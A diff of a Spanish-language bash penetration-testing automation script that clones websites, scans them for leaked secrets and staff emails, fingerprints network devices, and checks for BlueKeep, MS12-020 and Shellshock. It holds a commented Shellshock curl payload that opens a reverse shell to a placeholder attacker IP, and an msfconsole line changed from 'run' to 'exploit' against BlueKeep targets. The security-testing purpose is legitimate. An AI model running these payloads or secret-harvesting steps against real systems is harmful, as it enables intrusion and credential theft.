-	#egrep -i " password | contrase| pin | firma| key | api " ../.enumeracion/"$DOMINIO"_web_comentario.txt | egrep -v "shift key|Key event|return key|key and mouse|bind key" > ../.vulnerabilidades/"$DOMINIO"_web_comentario.txt
-	###############################						
-cd ../	 # salir de webCLone
-
-############################################################################
-echo -e "[+] Extraer metadatos de sitios clonados"										
-exiftool archivos > logs/enumeracion/"$DOMINIO"_metadata_exiftool.txt
-egrep -i "Author|creator" logs/enumeracion/"$DOMINIO"_metadata_exiftool.txt | awk '{print $3}' | egrep -iv "tool|adobe|microsoft|PaperStream|Acrobat|JasperReports|Mozilla" |sort |uniq  > .enumeracion/"$DOMINIO"_metadata_exiftool.txt
-
-##### Reporte metadatos (sitio web) ##
-sed 's/ /-/g' -i .enumeracion/"$DOMINIO"_metadata_exiftool.txt # cambiar espacios por "-"
-echo "Nombre;Apellido;Correo;Cargo" > reportes/correos_metadata.csv
-for nombreCompleto in `more .enumeracion/"$DOMINIO"_metadata_exiftool.txt`; do	
-#echo "nombreCompleto $nombreCompleto"
-	if [[ ${nombreCompleto} == *"-"*  ]];then 			
-		nombre=`echo $nombreCompleto | cut -f1 -d "-"`
-		apellido=`echo $nombreCompleto | cut -f2 -d "-"`
-		echo "$nombre;$apellido;$apellido@$DOMINIO;n/a" > reportes/correos_metadata.csv 
-	fi
-done
-################
-
-#  Eliminar URLs repetidas (clonacion)
-echo -e "[+] Eliminar URLs repetidas (Extraidos de la clonacion)"										
-sort logs/enumeracion/"$DOMINIO"_web_wget2.txt 2>/dev/null | uniq > .enumeracion/"$DOMINIO"_web_wgetURLs.txt
-insert_data
+	#  Eliminar URLs repetidas (clonacion)
+	echo -e "[+] Eliminar URLs repetidas (Extraidos de la clonacion)"										
+	sort logs/enumeracion/"$DOMINIO_EXTERNO"_web_wget2.txt 2>/dev/null | uniq > .enumeracion/"$DOMINIO_EXTERNO"_web_wgetURLs.txt
+	insert_data
 
 
-# filtrar error de conexion a base de datos y otros errores
-egrep -ira --color=never "mysql_query| mysql_fetch_array|access denied for user|mysqli|Undefined index" webClone/* 2>/dev/null| sed 's/webClone\///g' >> .enumeracion/"$DOMINIO"_web_errores.txt
+	# filtrar error de conexion a base de datos y otros errores
+	egrep -ira --color=never "mysql_query| mysql_fetch_array|access denied for user|mysqli|Undefined index" webClone/* 2>/dev/null| sed 's/webClone\///g' >> .enumeracion/"$DOMINIO_EXTERNO"_web_errores.txt
 
-# correos presentes en los sitios web
-grep -Eirao "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" webClone/* | cut -d ":" -f2 | egrep --color=never $"com|net|org|bo|es" |  sort |uniq  >> .enumeracion/"$DOMINIO"_web_correos.txt
+	# correos presentes en los sitios web
+	grep -Eirao "\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b" webClone/* | cut -d ":" -f2 | egrep --color=never $"com|net|org|bo|es" |  sort |uniq  >> .enumeracion/"$DOMINIO_EXTERNO"_web_correos.txt
 
-# aws_access_key 
-egrep -ira --color=never "aws_access_key_id|aws_secret_access_key" webClone/* > .vulnerabilidades/"$DOMINIO"_aws_secrets.txt 
+	# aws_access_key 
+	egrep -ira --color=never "aws_access_key_id|aws_secret_access_key" webClone/* > .vulnerabilidades/"$DOMINIO_EXTERNO"_aws_secrets.txt 
 
-echo -e "[+] Buscar datos sensible en archivos clonados"	
-cd webClone
-rm checksumsEscaneados.txt # tiene hashes md5 
-# Creando repositorio temporal para que pueda ser escaneado por las herramientas
+	echo -e "[+] Buscar datos sensible en archivos clonados"	
+	cd webClone
+	rm checksumsEscaneados.txt # tiene hashes md5 
+	# Creando repositorio temporal para que pueda ser escaneado por las herramientas
 
-# cat manifest.js | js-beautify  | tee manifest.js
+	# cat manifest.js | js-beautify  | tee manifest.js
 
-rm -rf .git 2>/dev/null
-git init
-git add .
-git commit -m "test"
+	rm -rf .git 2>/dev/null
+	git init
+	git add .
+	git commit -m "test"
 
-# llaves SSH
-echo -e "\nllaves SSH" >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
-docker run -v `pwd`:/files -it dumpster-diver -p files --min-key 70 --max-key 72 --entropy 5.1  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
+	# llaves SSH
+	echo -e "\nllaves SSH" >> ../logs/vulnerabilidades/"$DOMINIO_EXTERNO"_dumpster_secrets.txt 
+	docker run -v `pwd`:/files -it dumpster-diver -p files --min-key 70 --max-key 72 --entropy 5.1  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO_EXTERNO"_dumpster_secrets.txt 
 
-# AWS Secret Access Key
-echo -e "\nAWS Secret Access Key" >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
-docker run -v `pwd`:/files -it dumpster-diver -p files --min-key 40 --max-key 40 --entropy 4.3   | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
+	# AWS Secret Access Key
+	echo -e "\nAWS Secret Access Key" >> ../logs/vulnerabilidades/"$DOMINIO_EXTERNO"_dumpster_secrets.txt 
+	docker run -v `pwd`:/files -it dumpster-diver -p files --min-key 40 --max-key 40 --entropy 4.3   | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO_EXTERNO"_dumpster_secrets.txt 
 
-# Azure Shared Key
-echo -e "\nAzure Shared Key" >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
-docker run -v `pwd`:/files -it dumpster-diver -p files --min-key 66 --max-key 66 --entropy 5.1  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
+	# Azure Shared Key
+	echo -e "\nAzure Shared Key" >> ../logs/vulnerabilidades/"$DOMINIO_EXTERNO"_dumpster_secrets.txt 
+	docker run -v `pwd`:/files -it dumpster-diver -p files --min-key 66 --max-key 66 --entropy 5.1  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO_EXTERNO"_dumpster_secrets.txt 
 
-# RSA private key 
-echo -e "\n RSA private key " >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
-docker run -v `pwd`:/files -it dumpster-diver -p files --min-key 76 --max-key 76 --entropy 5.1  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
+	# RSA private key 
+	echo -e "\n RSA private key " >> ../logs/vulnerabilidades/"$DOMINIO_EXTERNO"_dumpster_secrets.txt 
+	docker run -v `pwd`:/files -it dumpster-diver -p files --min-key 76 --max-key 76 --entropy 5.1  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO_EXTERNO"_dumpster_secrets.txt 
 
-# passwords 
-echo -e "\n passwords " >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
-docker run -v `pwd`:/files -it dumpster-diver -p files --min-pass 9 --max-pass 15 --pass-complex 8  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
+	# passwords 
+	echo -e "\n passwords " >> ../logs/vulnerabilidades/"$DOMINIO_EXTERNO"_dumpster_secrets.txt 
+	docker run -v `pwd`:/files -it dumpster-diver -p files --min-pass 9 --max-pass 15 --pass-complex 8  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >>  ../logs/vulnerabilidades/"$DOMINIO_EXTERNO"_dumpster_secrets.txt 
 
 
-# generic token - dumpster-diver
-echo -e "\n generic token (dumpster-diver)" >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
-docker run -v `pwd`:/files -it dumpster-diver -p files --min-key 25 --max-key 40 --entropy 4.6  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >> ../logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt 
+	# generic token - dumpster-diver
+	echo -e "\n generic token (dumpster-diver)" >> ../logs/vulnerabilidades/"$DOMINIO_EXTERNO"_dumpster_secrets.txt 
+	docker run -v `pwd`:/files -it dumpster-diver -p files --min-key 25 --max-key 40 --entropy 4.6  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" >> ../logs/vulnerabilidades/"$DOMINIO_EXTERNO"_dumpster_secrets.txt 
 
-# generic token - truffle
-docker run --rm -v "$(pwd):/project" trufflehog  --rules /etc/truffle-rules.json  --exclude_paths  /etc/truffle-exclude.txt --regex --json file:///project  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" > ../logs/vulnerabilidades/"$DOMINIO"_trufflehog_secrets.txt
+	# generic token - truffle
+	docker run --rm -v "$(pwd):/project" trufflehog  --rules /etc/truffle-rules.json  --exclude_paths  /etc/truffle-exclude.txt --regex --json file:///project  | sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" > ../logs/vulnerabilidades/"$DOMINIO_EXTERNO"_trufflehog_secrets.txt
 
-cd ..
+	cd ..
 
-grep "found" logs/vulnerabilidades/"$DOMINIO"_dumpster_secrets.txt > .vulnerabilidades/"$DOMINIO"_web_secrets.txt 
-grep "found" logs/vulnerabilidades/"$DOMINIO"_trufflehog_secrets.txt >> .vulnerabilidades/"$DOMINIO"_web_secrets.txt 
-find servicios -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
-insert_data
-###################
+	grep "found" logs/vulnerabilidades/"$DOMINIO_EXTERNO"_dumpster_secrets.txt > .vulnerabilidades/"$DOMINIO_EXTERNO"_web_secrets.txt 
+	grep "found" logs/vulnerabilidades/"$DOMINIO_EXTERNO"_trufflehog_secrets.txt >> .vulnerabilidades/"$DOMINIO_EXTERNO"_web_secrets.txt 
+	find servicios -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
+	insert_data
+	###################
+fi
 
 
 if [ -f servicios/smb_uniq.txt ]
@@ -3729,13 +3805,13 @@ then
 				blueKeep $ip >> logs/vulnerabilidades/"$ip"_3389_BlueKeep.txt
 				grep "VULNERABLE" logs/vulnerabilidades/"$ip"_3389_BlueKeep.txt  > .vulnerabilidades/"$ip"_3389_BlueKeep.txt
 			else # es rasberry
-				msfconsole -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep;set RHOSTS $ip;run;exit" > logs/vulnerabilidades/"$ip"_3389_BlueKeep.txt
+				msfconsole -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep;set RHOSTS $ip;exploit;exit" > logs/vulnerabilidades/"$ip"_3389_BlueKeep.txt
 				grep "target is vulnerable" logs/vulnerabilidades/"$ip"_3389_BlueKeep.txt  > .vulnerabilidades/"$ip"_3389_BlueKeep.txt
 			fi
 
 			
 			echo -e "\t\t[+] Revisando vulnerabilidad MS12-020"
-			nmap -sV -Pn --script=rdp-vuln-ms12-020 -p 3389 $ip > logs/vulnerabilidades/"$ip"_3389_ms12020.txt
+			nmap -sV -Pn --script=rdp-vuln-ms12-020,rdp-ntlm-info -p 3389 $ip > logs/vulnerabilidades/"$ip"_3389_ms12020.txt
 			grep "|" logs/vulnerabilidades/"$ip"_3389_ms12020.txt  | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" > .vulnerabilidades/"$ip"_3389_ms12020.txt
 			
 			while true; do
@@ -3793,6 +3869,24 @@ then
 	insert_data	
 fi
 
+if [ -f servicios/voip.txt ]
+then
+	echo -e "$OKBLUE #################### VoIP (`wc -l servicios/voip.txt`) ######################$RESET"	    	
+	for line in $(cat servicios/voip.txt); do
+		ip=`echo $line | cut -f1 -d":"`
+		port=`echo $line | cut -f2 -d":"`
+		
+		echo -e "[+] Obteniendo extensiones $ip:$port"		
+		svwar -m INVITE -e1-500 $ip > logs/enumeracion/"$ip"_voip_extensions.txt 
+		grep reqauth logs/enumeracion/"$ip"_voip_extensions.txt > .enumeracion/"$ip"_voip_extensions.txt
+				
+	done		
+	
+	insert_data	
+fi
+
+		
+
 if [ -f servicios/ftp.txt ]
 then
 	echo -e "$OKBLUE #################### FTP (`wc -l servicios/ftp.txt`) ######################$RESET"	    
@@ -3836,35 +3930,45 @@ then
 	
 fi
 
-
+find servicios -size  0 -print0 |xargs -0 rm 2>/dev/null # delete empty files
 if [ -f servicios/cgi.txt ]
 then
         		
 		echo -e "$OKBLUE #################### CGI (`wc -l servicios/cgi.txt`) ######################$RESET"	  
-		for line in $(cat servicios/cgi.txt); do
-			ip=`echo $line |  cut -d ":" -f 2 | tr -d /`
-			port_path=`echo $line | cut -d ":" -f 3`
-			port=`echo $port_path | cut -d "/" -f 1`
-			path="/"`echo $port_path | cut -d "/" -f 2-8`
-			
-			echo -e "[+] Escaneando $ip:$port"	
-			echo -e "\t \t[+] Revisando vulnerabilidad Shellsock ip=$ip path=$path"
+
+		num_lines=`wc -l servicios/cgi.txt`
+		echo "num_lines ($num_lines)"
+		
+		if [ "$num_lines" -le 3 ] ; then		
+
+			for line in $(cat servicios/cgi.txt); do
+				ip=`echo $line |  cut -d ":" -f 2 | tr -d /`
+				port_path=`echo $line | cut -d ":" -f 3`
+				port=`echo $port_path | cut -d "/" -f 1`
+				path="/"`echo $port_path | cut -d "/" -f 2-8`
 				
-			echo "nmap -sV -p $port --script http-shellshock.nse --script-args uri=$path $ip" >> logs/vulnerabilidades/"$ip"_"$port"_shellshock.txt
-			nmap -Pn -sV -p $port --script http-shellshock.nse --script-args uri=$path $ip >> logs/vulnerabilidades/"$ip"_"$port"_shellshock.txt
-			grep "|" logs/vulnerabilidades/"$ip"_"$port"_shellshock.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED|http-server-header" > .vulnerabilidades/"$ip"_"$port"_shellshock.txt	
-			
-			if [ -s .vulnerabilidades/"$ip"_"$port"_shellshock.txt ] # if FILE exists and has a size greater than zero.
-			then
-				echo -e "\t$OKRED[!] Vulnerable a Shellsock \n $RESET" 
-				echo -e "\t\n URL: http://$ip$path \n"  > .vulnerabilidades/"$ip"_"$port"_shellshock.txt
-				grep "|" logs/vulnerabilidades/"$ip"_"$port"_shellshock.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" >> .vulnerabilidades/"$ip"_"$port"_shellshock.txt	
-			else				
-				echo -e "\t$OKGREEN[i] No vulnerable a Shellsock $RESET"
-			fi
-			# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/{attacker-IP-address}/{listen-port} 0>&1'" http://{target}/cgi-bin/{vulnerable}
-			
-		done
+				echo -e "[+] Escaneando $ip:$port"	
+				echo -e "\t \t[+] Revisando vulnerabilidad Shellsock ip=$ip path=$path"
+					
+				echo "nmap -sV -p $port --script http-shellshock.nse --script-args uri=$path $ip" >> logs/vulnerabilidades/"$ip"_"$port"_shellshock.txt
+				nmap -Pn -sV -p $port --script http-shellshock.nse --script-args uri=$path $ip >> logs/vulnerabilidades/"$ip"_"$port"_shellshock.txt
+				grep "|" logs/vulnerabilidades/"$ip"_"$port"_shellshock.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED|http-server-header|Problem" > .vulnerabilidades/"$ip"_"$port"_shellshock.txt	
+				
+				if [ -s .vulnerabilidades/"$ip"_"$port"_shellshock.txt ] # if FILE exists and has a size greater than zero.
+				then
+					echo -e "\t$OKRED[!] Vulnerable a Shellsock \n $RESET" 
+					echo -e "\t\n URL: http://$ip$path \n"  > .vulnerabilidades/"$ip"_"$port"_shellshock.txt
+					grep "|" logs/vulnerabilidades/"$ip"_"$port"_shellshock.txt | egrep -iv "ACCESS_DENIED|false|Could|ERROR|DISABLED" >> .vulnerabilidades/"$ip"_"$port"_shellshock.txt	
+				else				
+					echo -e "\t$OKGREEN[i] No vulnerable a Shellsock $RESET"
+				fi
+				# curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/{attacker-IP-address}/{listen-port} 0>&1'" http://{target}/cgi-bin/{vulnerable}
+				
+			done
+
+		fi
+
+		
 	
 	#insert clean data	
 	insert_data		 	
@@ -3872,48 +3976,6 @@ fi
 
 
 
-if [ -f servicios/dns.txt ]
-then
-	echo -e "$OKBLUE #################### DNS (`wc -l servicios/dns.txt`) ######################$RESET"	  
-	for line in $(cat servicios/dns.txt); do
-		ip=`echo $line | cut -f1 -d":"`
-		port=`echo $line | cut -f2 -d":"`
-		echo -e "[+] Escaneando $ip:$port"	
-		echo -e "\t [+] Probando transferencia de zona"
-			
-			### zone transfer ###			
-			zone_transfer=`dig -tAXFR @$ip $DOMINIO`
-			echo "dig -tAXFR @$ip $dominio" > logs/vulnerabilidades/"$ip"_53_transferenciaDNS.txt 
-			echo $zone_transfer >> logs/vulnerabilidades/"$ip"_53_transferenciaDNS.txt 
-			if [[ ${zone_transfer} != *"failed"*  && ${zone_transfer} != *"timed out"* && ${zone_transfer} != *"error"* ]];then
-				echo $zone_transfer > .vulnerabilidades/"$ip"_53_transferenciaDNS.txt 
-				echo -e "\t$OKRED[!] Transferencia de zona detectada \n $RESET"
-			else
-				
-				echo -e "\t$OKGREEN[i] No se pudo realizar la transferencia de zona$RESET"
-			fi	
-			
-			if [ $internet == "s" ]; then 			
-				#open resolver
-				echo -e "\t [+] Probando si es un servidor DNS openresolver"
-				dig ANY google.com @$ip +short | grep --color=never google | egrep -iv "failed|DiG" > .vulnerabilidades/"$ip"_53_openresolver.txt 2>/dev/null &																			
-			fi	
-	done
-	
-	# revisar si hay scripts ejecutandose
-	while true; do
-	dig_instancias=`ps aux | egrep 'dig' | grep -v digitalocean| wc -l`		
-	if [ "$dig_instancias" -gt 1 ]
-	then
-		echo -e "\t[i] Todavia hay scripts activos ($dig_instancias)"				
-		sleep 10
-		else
-			break		
-		fi
-	done	# done true	
-	#insert clean data	
-	insert_data		
-fi
 
 
 	
@@ -3980,26 +4042,26 @@ cat .escaneo_puertos_banners/*.txt > reportes/nmap-tcp-banners.txt 2>/dev/null
 
 
 cd .escaneo_puertos		
-	grep -i "MikroTik" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/MikroTik2.txt
-	grep ' 8728/open' nmap-tcp.grep 2>/dev/null| awk '{print $2}' >> ../servicios/MikroTik2.txt 
+	grep -i "MikroTik" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/MikroTik2.txt
+	grep ' 8728/open' nmap-tcp.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/MikroTik2.txt 
 	sort ../servicios/MikroTik2.txt | sort | uniq > ../servicios/MikroTik.txt; rm ../servicios/MikroTik2.txt
 	
-	grep -i "d-link" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/d-link2.txt
-	grep -i "Dropbear sshd" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/ubiquiti2.txt
-	grep -i "forti" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/fortinet2.txt
-	grep -i "3com" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/3com2.txt
-	grep -i "linksys" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/linksys2.txt
-	grep -i "Netgear" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/Netgear.txt
-	grep -i "zyxel" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/zyxel.txt
-	grep -i "ZTE" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/ZTE2.txt
-	grep -i "UPS devices or Windows" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/ZTE2.txt
-	grep -i "TP-link" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/tp-link.txt
-	#grep -i "cisco" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/cisco.txt
-	grep -i "ASA" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/ciscoASA.txt	
-	grep -i "samba" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/samba.txt
-	grep -i "Allegro RomPager" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/RomPager.txt
-	grep -i "NetScreen" nmap-tcp-banners.grep | grep -iv "Virata" 2>/dev/null | awk '{print $2}' >> ../servicios/NetScreen.txt #juniper
-	grep -i "UPnP" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' >> ../servicios/upnp.txt; sort ../servicios/upnp.txt | uniq >../servicios/upnp2.txt ; mv ../servicios/upnp2.txt ../servicios/upnp.txt
+	grep -i "d-link" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/d-link2.txt
+	grep -i "Dropbear sshd" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/ubiquiti2.txt
+	grep -i "forti" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/fortinet2.txt
+	grep -i "3com" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/3com2.txt
+	grep -i "linksys" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/linksys2.txt
+	grep -i "Netgear" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/Netgear.txt
+	grep -i "zyxel" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/zyxel.txt
+	grep -i "ZTE" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/ZTE2.txt
+	grep -i "UPS devices or Windows" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/ZTE2.txt
+	grep -i "TP-link" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/tp-link.txt
+	#grep -i "cisco" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/cisco.txt
+	grep -i "ASA" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/ciscoASA.txt	
+	grep -i "samba" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/samba.txt
+	grep -i "Allegro RomPager" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/RomPager.txt
+	grep -i "NetScreen" nmap-tcp-banners.grep | grep -iv "Virata" 2>/dev/null | awk '{print $2}' | uniq >> ../servicios/NetScreen.txt #juniper
+	grep -i "UPnP" nmap-tcp-banners.grep 2>/dev/null| awk '{print $2}' | uniq >> ../servicios/upnp.txt; sort ../servicios/upnp.txt | uniq >../servicios/upnp2.txt ; mv ../servicios/upnp2.txt ../servicios/upnp.txt
 	
 	### Revisar certificados SSL, Titulos web ##
 cd ..
@@ -4009,33 +4071,33 @@ cd .enumeracion2/
 	
 	#phpmyadmin, etc
 	#responde con 401
-	grep --color=never -i admin * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|whois|google|webData|Usando archivo" | grep 401 | awk '{print $2}' | sort | uniq -i >> ../servicios/web401.txt
+	grep --color=never -i admin * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|whois|google|webData|Usando archivo" | grep 401 | awk '{print $2}' | sort | uniq -i | uniq >> ../servicios/web401.txt
 	
 	#.enumeracion/"$ip"_"$port"_admin.txt 
 	#responde con 200 OK
-	cat *_admin.txt 2>/dev/null | grep 200 | awk '{print $2}' | sort | uniq -i >> ../servicios/admin-web.txt
+	cat *_admin.txt 2>/dev/null | grep 200 | awk '{print $2}' | sort | uniq -i | uniq >> ../servicios/admin-web.txt
 	
 	#tomcat
-	grep --color=never -i "/manager/html" * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|whois|google" | awk '{print $2}' | sort | uniq -i >> ../servicios/admin-web.txt
+	grep --color=never -i "/manager/html" * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep|whois|google" | awk '{print $2}' | sort | uniq -i | uniq >> ../servicios/admin-web.txt
 	# 
 	
 	#fortinet
-	grep --color=never -i forti * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | cut -d "_" -f1 >> ../servicios/fortinet2.txt
+	grep --color=never -i forti * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | cut -d "_" -f1 | uniq >> ../servicios/fortinet2.txt
 	sort ../servicios/fortinet2.txt | uniq > ../servicios/fortinet.txt
 	rm ../servicios/fortinet2.txt
 	
 	#3com
-	grep --color=never -i 3com * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | cut -d "_" -f1 >> ../servicios/3com2.txt
+	grep --color=never -i 3com * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | cut -d "_" -f1 | uniq >> ../servicios/3com2.txt
 	sort ../servicios/3com2.txt | uniq > ../servicios/3com.txt
 	rm ../servicios/3com2.txt
 	
 	#d-link
-	grep --color=never -i d-link * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | cut -d "_" -f1 >> ../servicios/d-link2.txt
+	grep --color=never -i d-link * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | cut -d "_" -f1 | uniq >> ../servicios/d-link2.txt
 	sort ../servicios/d-link2.txt | uniq > ../servicios/d-link.txt
 	rm ../servicios/d-link2.txt
 
 	#linksys
-	grep --color=never -i linksys * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | cut -d "_" -f1 >> ../servicios/linksys2.txt
+	grep --color=never -i linksys * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | cut -d "_" -f1 | uniq >> ../servicios/linksys2.txt
 	sort ../servicios/linksys2.txt | uniq > ../servicios/linksys.txt
 	rm ../servicios/linksys2.txt
 		
@@ -4048,35 +4110,35 @@ cd .enumeracion2/
 	grep --color=never -i "Dahua Camera" * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" > ../servicios/dahua_camara.txt
 	
 	#ubiquiti
-	grep --color=never -i ubiquiti * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" >> ../servicios/ubiquiti2.txt	
+	grep --color=never -i ubiquiti * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/ubiquiti2.txt	
 	sort ../servicios/ubiquiti2.txt | uniq > ../servicios/ubiquiti.txt ; rm ../servicios/ubiquiti2.txt
 	
 	#pfsense
-	grep --color=never -i pfsense * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" >> ../servicios/pfsense.txt
+	grep --color=never -i pfsense * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/pfsense.txt
 	
 	#PRTG
-	grep --color=never -i PRTG * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" >> ../servicios/PRTG.txt
+	grep --color=never -i PRTG * 2>/dev/null | egrep -v "302|301|subdominios.txt|comentario|wgetURLs|HTTPSredirect|metadata|google|3389|deep" | egrep --color=never "^1" | sort | cut -d "_" -f1-2 | uniq | tr "_" ":" | uniq >> ../servicios/PRTG.txt
 	
 	#ZKsoftware
